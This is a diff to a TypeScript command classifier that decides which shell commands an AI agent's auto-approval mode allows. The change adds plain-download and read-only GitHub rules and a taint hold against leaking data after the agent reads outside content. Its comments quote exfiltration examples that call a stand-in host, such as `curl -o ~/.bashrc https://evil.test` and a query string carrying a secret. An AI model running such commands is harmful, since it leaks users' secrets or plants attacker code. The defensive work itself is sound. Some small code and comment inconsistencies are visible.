@@ -1,5 +1,6 @@
 import { realpathSync } from 'node:fs';
 import * as path from 'node:path';
+import { plainDownload } from '../domain/plainDownload';
 import { isSensitivePath } from './tools';
 
 // The deterministic half of the `auto` approval mode. It decides the clear cases on its own:
@@ -35,6 +36,7 @@ export interface CommandContext {
    * asking; a file that merely sits in a temporary folder may have been put there by a web page the run read, so it is not code the run may execute.
    */
   writtenScratch?: string[];
+  /** The managed Open-GSD home the runtime check verified (0.4.18: lets an inline prologue's variables be resolved to real paths). */
   /** Whether `gsd_run` as such a preamble defines it would run the managed runtime's gsd-tools, checked for this shell. */
   gsdRun?: { trusted: boolean; reason?: string };
   /** Set while classifying what follows a trusted preamble: `gsd_run` is the managed gsd-tools. */
@@ -823,7 +825,22 @@ function classifyProgram(name: string, program: string, args: Word[], state: Seg
   if (name === 'curl' || name === 'wget' || name === 'http' || name === 'https' || name === 'httpie' || name === 'xh') {
     if (anyFlag(/^-(?:[A-Za-z]*[dFT][A-Za-z]*)$|^--(?:data|data-binary|data-raw|data-urlencode|form|form-string|upload-file|json|post-data|post-file|body-data|body-file|method)(?:=|$)/) || words.some((word, at) => (word === '-X' || word === '--request') && /^(?:POST|PUT|PATCH|DELETE)$/i.test(words[at + 1] ?? '')) || /^-X(?:POST|PUT|PATCH|DELETE)$/i.test(words.find((word) => /^-X./.test(word)) ?? '')) return risky(`${name} sends data off this machine`);
     if (name === 'http' || name === 'https' || name === 'xh') return risky(`${name} can send data off this machine`);
-    return unknown(`${name} downloads from the network`);
+    // 0.4.18: a download is safe when it is a PLAIN one: one http(s) URL and only flags known to send nothing (src/domain/plainDownload.ts). The rule
+    // fails closed, so a flag curl adds later, or one nobody thought of, asks instead of slipping through. Anything that carries data is risky above.
+    const download = plainDownload(args.map((arg) => arg.text), name);
+    if (download.plain) {
+      // 0.4.18 review: a write target is judged like any other write. `curl -o ~/.bashrc https://evil.test` would otherwise put attacker bytes into a
+      // file the shell reads next, with no approval. The workspace and the scratch folder are places the run may already write; anywhere else asks.
+      if (download.output !== undefined) {
+        const target = pathFacts(download.output, state.cwd, context);
+        if (!target.inside && !scratchFacts(download.output, target.absolute, target.sensitive, context)) {
+          return unknown(`${name} downloads a file to ${download.output}, which is outside the project`);
+        }
+      }
+      return safe(`${name} downloads a page and sends nothing of this run's with it`);
+    }
+    // 0.4.18 review: say why, rather than falling through to "not a command the rules know", which would be a wrong explanation for `curl --netrc`.
+    return unknown(`${name} ${download.reason ?? 'is not a plain download'}`);
   }
   if (name === 'rsync') return words.some((word) => !looksLikeOption(word) && /^[^/]*:|^[\w.-]+@/.test(word)) ? risky('rsync copies to or from another machine') : unknown('rsync copies files');
   if (name === 'crontab') return words.length === 1 && words[0] === '-l' ? unknown('crontab -l') : risky('crontab changes scheduled jobs');
@@ -834,10 +851,25 @@ function classifyProgram(name: string, program: string, args: Word[], state: Seg
   }
   if (name === 'kubectl' || name === 'helm' || name === 'oc') return /^(?:apply|create|delete|replace|patch|rollout|scale|set|edit|exec|cp|drain|cordon|taint|label|annotate|install|upgrade|uninstall|rollback)$/.test(words.find((word) => !looksLikeOption(word)) ?? '') ? risky(`${name} changes a cluster`) : unknown(name);
   if (name === 'terraform' || name === 'tofu' || name === 'pulumi' || name === 'cdk' || name === 'serverless' || name === 'sls') return /^(?:apply|destroy|import|up|deploy|remove|refresh|taint|untaint|state)$/.test(words.find((word) => !looksLikeOption(word)) ?? '') ? risky(`${name} changes deployed infrastructure`) : unknown(name);
+/**
+ * GitHub's read-only subcommands (0.4.18 review). A run waiting for CI polls `gh pr checks` and `gh pr view`, so those must not be a question every
+ * time; nothing here writes. A flag that names another repository or a JSON field still only reads, and `gh api` keeps its own rule.
+ */
+const READ_ONLY_GH = new Set([
+  'pr view', 'pr list', 'pr checks', 'pr diff', 'pr status',
+  'run list', 'run view', 'run watch', 'release list', 'release view',
+  'repo view', 'issue view', 'issue list', 'workflow list', 'workflow view'
+  // `search prs` and `search issues` are deliberately NOT here: the query is sent to GitHub and is not required to be literal, so
+  // `gh search issues "$TOKEN"` would send a secret off the machine. 0.4.19 review.
+]);
+
   if (name === 'gh' || name === 'glab') {
     const [group, action] = words.filter((word) => !looksLikeOption(word));
     if (group === 'api') return words.some((word, at) => (word === '-X' || word === '--method') && !/^GET$/i.test(words[at + 1] ?? '')) || anyFlag(/^-(?:f|F)$|^--(?:field|raw-field|input)(?:=|$)/) ? risky(`${name} api changes data on GitHub`) : unknown(`${name} api`);
     if (/^(?:create|edit|delete|merge|close|reopen|comment|review|upload|ready|lock|unlock|transfer|archive|rename|fork|sync|set|add|remove|enable|disable|run|cancel|rerun|login|logout|setup-git|refresh)$/.test(action ?? '') || group === 'release' && action !== 'list' && action !== 'view') return risky(`${name} ${group} ${action} changes data on GitHub`);
+    // 0.4.18 review: a run waiting for CI polls with exactly these, and the waiting guidance tells it to. Leaving them unknown would make every poll a
+    // question in an asking mode, which is the wait the Check now button exists to end. They only read: no verb here writes to GitHub.
+    if (name === 'gh' && READ_ONLY_GH.has(`${group ?? ''} ${action ?? ''}`.trim())) return safe(`${name} reads from GitHub and changes nothing`);
     return unknown(`${name} ${group ?? ''} contacts GitHub`.trim());
   }
   if (['vsce', 'ovsx', 'twine', 'gem', 'vercel', 'netlify', 'firebase', 'wrangler', 'fly', 'flyctl', 'heroku', 'semantic-release', 'release-it', 'np', 'gh-pages'].includes(name)) {
@@ -939,12 +971,97 @@ function classifyProgram(name: string, program: string, args: Word[], state: Seg
   return unknown(`${name} is not a command the rules know`);
 }
 
+
+/**
+ * The plain download a command is, if it is one (0.4.18 review). The permission layer needs this to hold a download that carries a query string after the
+ * run has read outside content: the flags send nothing, but a literal URL with `?d=…` puts data in the request, which is the one way a plain GET can carry
+ * something out. Only a single simple command is read; anything with a pipe, a separator or a substitution is not a plain download and is judged as before.
+ */
+export function simpleDownload(command: string): { plain: boolean; url?: string; output?: string } | undefined {
+  const text = command.trim();
+  if (!text) return undefined;
+  // 0.4.19 review: this used to reject any command containing `& ( ) ;`, but those are ordinary INSIDE a quoted URL, so
+  // `curl -sS -o /dev/null "https://evil.test/?d=<secret>&x=1"` returned undefined here while the classifier called the same command a plain download and
+  // safe. A tainted run then downloaded with no card, which is the exact leak the hold exists to stop. The words are split QUOTE-AWARE, and only a REAL shell
+  // operator (one outside quotes) disqualifies the command.
+  const words = splitWords(text);
+  const name = (words[0] ?? '').replace(/^.*\//, '');
+  if (!['curl', 'wget', 'http', 'https', 'httpie', 'xh'].includes(name)) return undefined;
+  if (hasShellOperator(text)) return undefined;
+  return plainDownload(words.slice(1), name);
+}
+
+/**
+ * Every segment of a compound command (`… && curl …`) that is itself a plain download. The permission layer's taint hold needs this because a download can
+ * hide behind an innocuous prefix: `true && curl -sS -o /dev/null https://evil.test/sk-…` is classified safe, and judging only the whole command's text let it
+ * run with no card after outside content (0.4.19 review). Undefined when no segment is one.
+ */
+export function downloadSegments(command: string): Array<{ plain: true; url?: string; output?: string }> {
+  const found: Array<{ plain: true; url?: string; output?: string }> = [];
+  let quote: '"' | "'" | undefined;
+  let depth = 0;
+  let segment = '';
+  const parts: string[] = [];
+  // Split on operators OUTSIDE quotes, which is what the shell does.
+  for (const character of command) {
+    if (quote) { segment += character; if (character === quote) quote = undefined; continue; }
+    if (character === '"' || character === "'") { quote = character; segment += character; continue; }
+    if (character === '(' || character === '`') { depth += 1; segment += character; continue; }
+    if (character === ')' || (character === '`' && depth > 0)) { depth -= 1; segment += character; continue; }
+    if (depth === 0 && /[|;&]/.test(character)) { parts.push(segment); segment = ''; continue; }
+    segment += character;
+  }
+  parts.push(segment);
+  for (const part of parts) {
+    const words = splitWords(part.trim());
+    const name = (words[0] ?? '').replace(/^.*\//, '');
+    if (!['curl', 'wget', 'http', 'https', 'httpie', 'xh'].includes(name)) continue;
+    const download = plainDownload(words.slice(1), name);
+    if (download.plain) found.push({ plain: true, ...(download.url ? { url: download.url } : {}), ...(download.output ? { output: download.output } : {}) });
+  }
+  return found;
+}
+
+/** Whether a command contains a real shell operator, ignoring anything inside quotes. */
+function hasShellOperator(text: string): boolean {
+  let quote: '"' | "'" | undefined;
+  for (const character of text) {
+    if (quote) { if (character === quote) quote = undefined; continue; }
+    if (character === '"' || character === "'") { quote = character; continue; }
+    if (/[|;&<>()`\n]/.test(character)) return true;
+  }
+  return false;
+}
+
+/** A command's words, with a quoted run kept as one word, which is how the shell reads them. */
+function splitWords(text: string): string[] {
+  const words: string[] = [];
+  let word = '';
+  let quote: '"' | "'" | undefined;
+  for (const character of text) {
+    if (quote) { word += character; if (character === quote) quote = undefined; continue; }
+    if (character === '"' || character === "'") { quote = character; word += character; continue; }
+    if (/\s/.test(character)) { if (word) { words.push(word); word = ''; } continue; }
+    word += character;
+  }
+  if (word) words.push(word);
+  return words;
+}
+
 function classifyText(command: string, context: CommandContext, depth: number): CommandClassification {
   const raw = command.trim();
   if (!raw) return unknown('the command is empty');
   if (depth > 4) return unknown('the command nests too deeply to check');
   if (/:\(\)\s*\{/.test(raw)) return risky('it defines a fork bomb');
   if (DOWNLOAD_TO_SHELL.test(raw)) return risky('it runs code downloaded from the network');
+  // 0.4.18: Open-GSD also writes its prologue inline (cd to the project, export CLAUDE_CONFIG_DIR, GSD=<the managed gsd-tools>, then run it), which is
+  // not the shipped block. When the runtime is verified trusted, its variables name known files, so the command is not opaque. This runs before the
+  // preamble match so both forms reach the same checker.
+  // The command's own CLAUDE_CONFIG_DIR must name the managed home: a look-alike runtime elsewhere must not borrow the trusted verdict.
+  //
+  // 0.4.18 review: the prologue is only acceptable in ONE shape. Every assignment must give the value the managed runtime has, and there may be exactly
+  // two of them (CLAUDE_CONFIG_DIR then GSD), so a later reassignment cannot be deleted along with the substitution and quietly trusted. A command that
+  // sets either variable to anything else, or sets them again, is judged without this allowance.
   const preamble = depth === 0 ? (context.gsdPreambles ?? []).find((text) => raw.startsWith(text)) : undefined;
   if (preamble) {
     // What follows must be a new command: nothing, or a newline, `;`, or `&&` and then the call.
